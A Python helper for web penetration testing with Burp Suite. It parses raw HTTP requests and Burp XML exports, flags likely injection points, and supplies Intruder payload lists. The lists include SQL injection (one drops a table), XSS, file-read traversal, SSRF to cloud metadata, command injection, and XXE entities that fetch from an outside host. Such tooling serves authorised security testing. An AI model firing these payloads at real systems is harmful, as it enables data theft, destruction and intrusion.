"""
Burp Suite raw request parser + injection point detector.
Parses raw HTTP requests (from Burp copy-paste, XML export, or proxy capture).
"""

import re
import json
import urllib.parse as urlparse
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class ParsedRequest:
    method: str = "GET"
    path: str = "/"
    http_version: str = "HTTP/1.1"
    host: str = ""
    headers: dict = field(default_factory=dict)
    body: str = ""
    content_type: str = ""
    url_params: list = field(default_factory=list)
    body_params: list = field(default_factory=list)
    json_keys: list = field(default_factory=list)
    cookies: list = field(default_factory=list)
    injection_points: list = field(default_factory=list)

    def full_url(self) -> str:
        scheme = "https"
        base = f"{scheme}://{self.host}{self.path}"
        if self.url_params:
            qs = "&".join(f"{p['name']}={p['value']}" for p in self.url_params)
            return f"{base}?{qs}"
        return base

    def to_dict(self) -> dict:
        return {
            "method": self.method,
            "url": self.full_url(),
            "host": self.host,
            "path": self.path,
            "headers": self.headers,
            "body": self.body[:2000],
            "content_type": self.content_type,
            "url_params": self.url_params,
            "body_params": self.body_params,
            "json_keys": self.json_keys,
            "cookies": self.cookies,
            "injection_points": self.injection_points,
        }


@dataclass
class InjectionPoint:
    location: str          # "url_param", "body_param", "json_key", "header", "cookie", "path_segment"
    name: str              # parameter name
    value: str             # current value
    context: str           # "string", "integer", "boolean", "json", "xml"
    test_types: list       # ["sqli", "xss", "ssrf", ...] based on location + context
    burp_marker: str = ""  # Burp §injection§ marker syntax


# ─────────────────────────────────────────────
# CORE PARSER
# ─────────────────────────────────────────────

def parse_raw_request(raw: str, default_host: str = "") -> ParsedRequest:
    """
    Parse a raw HTTP request string (Burp copy-paste format).

    Example input:
        POST /api/login HTTP/1.1
        Host: target.com
        Content-Type: application/json

        {"username":"admin","password":"test"}
    """
    raw = raw.strip()
    if not raw:
        return ParsedRequest()

    # Split head from body
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
        lines = head.split("\r\n")
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
        lines = head.split("\n")
    else:
        lines = raw.split("\n")
        body = ""

    req = ParsedRequest()
    req.body = body.strip()

    # Request line
    if not lines:
        return req
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) >= 1:
        req.method = parts[0].upper()
    if len(parts) >= 2:
        raw_path = parts[1]
        # Split path and query string
        if "?" in raw_path:
            path, qs = raw_path.split("?", 1)
            req.path = path
            req.url_params = _parse_query_string(qs)
        else:
            req.path = raw_path
    if len(parts) >= 3:
        req.http_version = parts[2]

    # Parse headers
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        if ":" in line:
            key, val = line.split(":", 1)
            key = key.strip()
            val = val.strip()
            req.headers[key] = val
            if key.lower() == "host":
                req.host = val
            elif key.lower() == "content-type":
                req.content_type = val.lower()
            elif key.lower() == "cookie":
                req.cookies = _parse_cookies(val)

    if not req.host:
        req.host = default_host

    # Parse body
    if req.body:
        if "application/json" in req.content_type or _looks_like_json(req.body):
            req.json_keys = _extract_json_keys(req.body)
        elif "application/x-www-form-urlencoded" in req.content_type:
            req.body_params = _parse_query_string(req.body)
        elif "multipart/form-data" in req.content_type:
            req.body_params = _parse_multipart_names(req.body)

    # Detect injection points
    req.injection_points = detect_injection_points(req)
    return req


def _parse_query_string(qs: str) -> list:
    params = []
    for part in qs.split("&"):
        if "=" in part:
            k, v = part.split("=", 1)
            params.append({"name": urlparse.unquote_plus(k),
                           "value": urlparse.unquote_plus(v)})
        elif part:
            params.append({"name": urlparse.unquote_plus(part), "value": ""})
    return params


def _parse_cookies(cookie_header: str) -> list:
    cookies = []
    for part in cookie_header.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies.append({"name": k.strip(), "value": v.strip()})
    return cookies


def _parse_multipart_names(body: str) -> list:
    """Extract field names from multipart body."""
    params = []
    for match in re.finditer(r'Content-Disposition:.*?name=["\']([^"\']+)["\']', body, re.IGNORECASE):
        params.append({"name": match.group(1), "value": ""})
    return params


def _looks_like_json(s: str) -> bool:
    s = s.strip()
    return (s.startswith("{") and s.endswith("}")) or (s.startswith("[") and s.endswith("]"))


def _extract_json_keys(body: str, prefix: str = "") -> list:
    """Recursively extract all JSON key paths."""
    keys = []
    try:
        data = json.loads(body)
        keys = _walk_json(data, prefix)
    except Exception:
        # Fallback: regex
        for match in re.finditer(r'"([^"]+)"\s*:', body):
            keys.append({"path": match.group(1), "value": ""})
    return keys


def _walk_json(data, prefix: str = "") -> list:
    keys = []
    if isinstance(data, dict):
        for k, v in data.items():
            full_key = f"{prefix}.{k}" if prefix else k
            keys.append({"path": full_key, "value": str(v)[:100] if not isinstance(v, (dict, list)) else ""})
            if isinstance(v, (dict, list)):
                keys.extend(_walk_json(v, full_key))
    elif isinstance(data, list):
        for i, item in enumerate(data[:5]):
            keys.extend(_walk_json(item, f"{prefix}[{i}]"))
    return keys


# ─────────────────────────────────────────────
# INJECTION POINT DETECTOR
# ─────────────────────────────────────────────

def detect_injection_points(req: ParsedRequest) -> list:
    """
    Analyze parsed request and return list of injection point dicts.
    Each point includes suggested test types based on name/value heuristics.
    """
    points = []

    # URL params
    for p in req.url_params:
        pts = _infer_test_types(p["name"], p["value"], "url_param")
        points.append({
            "location": "url_param",
            "name": p["name"],
            "value": p["value"],
            "context": _infer_context(p["value"]),
            "test_types": pts,
            "burp_marker": f"§{p['value']}§",
        })

    # Body params (form-urlencoded)
    for p in req.body_params:
        pts = _infer_test_types(p["name"], p["value"], "body_param")
        points.append({
            "location": "body_param",
            "name": p["name"],
            "value": p["value"],
            "context": _infer_context(p["value"]),
            "test_types": pts,
            "burp_marker": f"§{p['value']}§",
        })

    # JSON keys
    for j in req.json_keys:
        pts = _infer_test_types(j["path"], j["value"], "json_key")
        points.append({
            "location": "json_key",
            "name": j["path"],
            "value": j["value"],
            "context": "json",
            "test_types": pts,
            "burp_marker": f'§{j["value"]}§',
        })

    # Cookie values
    SESSION_COOKIES = {"sessionid", "phpsessid", "jsessionid", "asp.net_sessionid",
                       "connect.sid", "laravel_session", "ci_session"}
    for c in req.cookies:
        if c["name"].lower() in SESSION_COOKIES:
            continue  # Skip session tokens
        pts = _infer_test_types(c["name"], c["value"], "cookie")
        points.append({
            "location": "cookie",
            "name": c["name"],
            "value": c["value"],
            "context": _infer_context(c["value"]),
            "test_types": pts,
            "burp_marker": f"§{c['value']}§",
        })

    # Interesting headers
    INJECTABLE_HEADERS = {
        # IP / routing spoofing
        "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
        "X-Custom-IP-Authorization", "True-Client-IP", "CF-Connecting-IP",
        # Host header injection → password reset, cache poisoning, SSRF
        "Host", "X-Forwarded-Host", "X-Host", "X-Original-Host",
        # URL override → auth bypass
        "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
        # CORS origin testing
        "Origin",
        # Common injection vectors
        "Referer", "User-Agent",
        # Auth / API keys
        "X-Api-Key", "Authorization", "X-Auth-Token", "X-Access-Token",
        # Content negotiation → XXE
        "Accept", "Content-Type",
    }
    for hname, hval in req.headers.items():
        if hname in INJECTABLE_HEADERS:
            pts = _infer_test_types(hname, hval, "header")
            points.append({
                "location": "header",
                "name": hname,
                "value": hval,
                "context": "string",
                "test_types": pts,
                "burp_marker": f"§{hval}§",
            })

    return points


def _infer_context(value: str) -> str:
    """Guess the data type/context of a value."""
    v = value.strip()
    if v.isdigit():
        return "integer"
    if v.lower() in ("true", "false"):
        return "boolean"
    if _looks_like_json(v):
        return "json"
    if re.match(r'^<[^>]+>', v):
        return "xml"
    return "string"


def _infer_test_types(name: str, value: str, location: str) -> list:
    """
    Based on parameter name, value, and location — suggest which injection
    tests are most applicable.
    """
    tests = set()
    name_lower = name.lower()
    val_lower = value.lower()

    # Universal
    tests.update(["xss", "sqli"])

    # URL/file inclusion params
    if any(kw in name_lower for kw in ["file", "path", "page", "include", "template",
                                        "doc", "folder", "dir", "load", "read", "view"]):
        tests.update(["lfi", "rfi", "path_traversal"])

    # URL/redirect params
    if any(kw in name_lower for kw in ["url", "redirect", "next", "goto", "return",
                                        "link", "callback", "redir", "target", "dest"]):
        tests.update(["ssrf", "open_redirect"])

    # Command execution params
    if any(kw in name_lower for kw in ["cmd", "exec", "command", "run", "shell",
                                        "ping", "host", "ip", "domain", "query"]):
        tests.update(["command_injection", "ssrf"])

    # Template injection
    if any(kw in name_lower for kw in ["template", "name", "title", "body", "message",
                                        "content", "text", "subject"]):
        tests.add("ssti")

    # SSRF in value
    if any(kw in val_lower for kw in ["http://", "https://", "ftp://", "file://",
                                       "localhost", "127.0.0.1", "192.168."]):
        tests.add("ssrf")

    # Headers — comprehensive per-header test mapping
    if location == "header":
        if "authorization" in name_lower:
            tests = {"jwt_manipulation", "token_forgery", "auth_bypass"}
        elif name_lower == "host":
            tests = {"host_header_injection", "ssrf", "password_reset_poisoning",
                     "cache_poisoning", "open_redirect"}
        elif any(kw in name_lower for kw in ["x-forwarded-host", "x-host", "x-original-host"]):
            tests = {"host_header_injection", "ssrf", "cache_poisoning"}
        elif any(kw in name_lower for kw in ["x-original-url", "x-rewrite-url", "x-override-url"]):
            tests = {"url_override", "auth_bypass", "access_control_bypass"}
        elif any(kw in name_lower for kw in ["forwarded-for", "real-ip", "client-ip",
                                              "true-client", "cf-connecting"]):
            tests = {"ip_spoofing", "auth_bypass", "rate_limit_bypass"}
        elif name_lower == "origin":
            tests = {"cors", "cors_misconfiguration"}
        elif name_lower == "referer":
            tests = {"open_redirect", "info_disclosure", "csrf"}
        elif name_lower == "user-agent":
            tests = {"sqli", "xss", "ssti", "command_injection"}
        elif name_lower in ("accept", "content-type"):
            tests = {"xxe", "content_type_confusion", "xss"}
        elif any(kw in name_lower for kw in ["api-key", "auth-token", "access-token"]):
            tests = {"token_forgery", "auth_bypass", "info_disclosure"}
        else:
            tests.update(["xss", "sqli", "ssti"])

    # Cookies
    if location == "cookie":
        tests.update(["session_manipulation"])
        if _looks_like_json(value):
            tests.add("json_injection")

    # Integer IDs → IDOR
    if _infer_context(value) == "integer" and any(
        kw in name_lower for kw in ["id", "user", "account", "order", "record", "item", "uid"]
    ):
        tests.add("idor")

    return sorted(tests)


# ─────────────────────────────────────────────
# BURP XML EXPORT PARSER
# ─────────────────────────────────────────────

def parse_burp_xml(xml_content: str) -> list[ParsedRequest]:
    """
    Parse Burp Suite XML export (multiple requests).
    Returns list of ParsedRequest objects.
    """
    import base64
    requests = []

    # Match <item> blocks
    items = re.findall(r'<item>(.*?)</item>', xml_content, re.DOTALL)
    for item in items:
        try:
            req_b64 = re.search(r'<request base64="true">(.*?)</request>', item, re.DOTALL)
            host_match = re.search(r'<host>(.*?)</host>', item)
            if req_b64:
                raw = base64.b64decode(req_b64.group(1).strip()).decode("utf-8", errors="replace")
                host = host_match.group(1).strip() if host_match else ""
                requests.append(parse_raw_request(raw, default_host=host))
            else:
                req_plain = re.search(r'<request>(.*?)</request>', item, re.DOTALL)
                if req_plain:
                    host = host_match.group(1).strip() if host_match else ""
                    requests.append(parse_raw_request(req_plain.group(1).strip(), default_host=host))
        except Exception:
            continue
    return requests


# ─────────────────────────────────────────────
# BURP-FORMATTED PAYLOAD GENERATOR
# ─────────────────────────────────────────────

def mark_injection_points(raw_request: str, injection_points: list) -> str:
    """
    Return the raw request with §markers§ around all detected injection point values.
    Compatible with Burp Intruder attack mode.
    """
    marked = raw_request
    for point in injection_points:
        val = point.get("value", "")
        if val and len(val) > 1:
            # Only replace first occurrence to avoid over-marking
            marked = marked.replace(val, f"§{val}§", 1)
    return marked


def build_intruder_payloads(test_type: str) -> list:
    """Return Burp Intruder payload list for a given test type."""
    payloads = {
        "sqli": [
            "'", "\"", "' OR '1'='1", "' OR 1=1--", "' AND SLEEP(5)--",
            "1 ORDER BY 1--", "1 UNION SELECT NULL--", "'; DROP TABLE users--",
            "admin'--", "' OR 1=1 LIMIT 1--", "1' AND '1'='1",
        ],
        "xss": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "'\"><script>alert(document.domain)</script>",
            "<svg onload=alert(1)>", "javascript:alert(1)",
            "<body onload=alert(1)>", "\" onmouseover=\"alert(1)",
            "<details open ontoggle=alert(1)>",
        ],
        "lfi": [
            "../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input", "file:///etc/passwd",
        ],
        "ssrf": [
            "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://192.168.1.1/", "http://[::1]/", "file:///etc/passwd",
            "dict://127.0.0.1:6379/INFO", "http://0.0.0.0/",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "{{config}}", "{{self.__class__.__mro__[2].__subclasses__()}}",
            "${class.forName('java.lang.Runtime')}",
        ],
        "command_injection": [
            "; id", "| id", "&& id", "$(id)", "`id`",
            "; sleep 5", "| sleep 5", "; cat /etc/passwd",
            "& ping -n 5 127.0.0.1",
        ],
        "open_redirect": [
            "https://evil.com", "//evil.com", "///evil.com",
            "https://target.com.evil.com", "javascript:alert(1)",
            "https:evil.com", "/\\evil.com", "%2f%2fevil.com",
        ],
        "idor": [str(i) for i in range(1, 20)] + ["0", "-1", "admin", "null"],
        "path_traversal": [
            "../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        "session_manipulation": ["0", "1", "admin", "true", "null"],
        "token_forgery": [],  # Manual
        "jwt_manipulation": [],  # Manual
        "host_header_injection": [
            "evil.com", "evil.com:80", "localhost", "127.0.0.1",
            "burpcollaborator.net", "169.254.169.254",
            "target.com.evil.com", "evil.com%23.target.com",
        ],
        "password_reset_poisoning": [
            "evil.com", "attacker.com", "burpcollaborator.net",
            "target.com.evil.com", "evil.com:8080",
        ],
        "cache_poisoning": [
            "evil.com", "javascript:alert(1)", "'-alert(1)-'",
            "x.y\r\nX-Injected: header",
        ],
        "cors": [
            "https://evil.com", "null", "https://target.com.evil.com",
            "https://attacker.com", "http://localhost",
        ],
        "cors_misconfiguration": [
            "https://evil.com", "null", "https://eviltarget.com",
            "https://target.com.attacker.com",
        ],
        "xxe": [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://127.0.0.1/'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://burpcollaborator.net/evil.dtd'>%xxe;]>",
        ],
        "ip_spoofing": [
            "127.0.0.1", "::1", "0.0.0.0", "localhost",
            "169.254.169.254", "192.168.1.1", "10.0.0.1",
        ],
        "auth_bypass": [
            "127.0.0.1", "localhost", "admin", "true", "null", "1",
        ],
        "rate_limit_bypass": [
            "127.0.0.1", "0.0.0.0", "::1", "10.0.0.1", "192.168.0.1",
        ],
        "url_override": [
            "/admin", "/internal", "/.env", "/actuator",
            "/api/admin", "/config", "/../admin",
        ],
        "access_control_bypass": [
            "/admin", "/manage", "/api/admin", "/internal", "/superadmin",
        ],
        "ssrf": [
            "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://192.168.1.1/", "http://[::1]/", "file:///etc/passwd",
            "dict://127.0.0.1:6379/INFO", "http://0.0.0.0/",
        ],
    }
    return payloads.get(test_type, [])


# ─────────────────────────────────────────────
# QUICK ANALYSIS SUMMARY
# ─────────────────────────────────────────────

def analyze_request(raw: str, default_host: str = "") -> dict:
    """
    Full analysis pipeline: parse → detect injection points → summarize.
    Returns dict ready to send to frontend.
    """
    req = parse_raw_request(raw, default_host=default_host)
    all_test_types = set()
    for pt in req.injection_points:
        all_test_types.update(pt.get("test_types", []))

    return {
        "parsed": req.to_dict(),
        "injection_point_count": len(req.injection_points),
        "suggested_tests": sorted(all_test_types),
        "risk_summary": _risk_summary(req),
        "marked_request": mark_injection_points(raw, req.injection_points),
    }


def _risk_summary(req: ParsedRequest) -> str:
    risks = []
    if req.method in ("POST", "PUT", "PATCH"):
        risks.append("State-changing method — CSRF risk")
    if any(p.get("context") == "integer" for p in req.injection_points):
        risks.append("Integer IDs present — check IDOR")
    if any("sqli" in p.get("test_types", []) for p in req.injection_points):
        risks.append("SQL-injectable parameters detected")
    if any("ssrf" in p.get("test_types", []) for p in req.injection_points):
        risks.append("SSRF-prone parameter detected")
    if any("lfi" in p.get("test_types", []) for p in req.injection_points):
        risks.append("File inclusion parameter detected")
    if any("host_header_injection" in p.get("test_types", []) for p in req.injection_points):
        risks.append("Host header injectable — check password reset poisoning & cache poisoning")
    if any("cors" in p.get("test_types", []) for p in req.injection_points):
        risks.append("CORS origin testable")
    if any("xxe" in p.get("test_types", []) for p in req.injection_points):
        risks.append("XXE-prone content type detected")
    if not risks:
        risks.append("Standard request — test all parameters for XSS and SQLi")
    return " | ".join(risks)
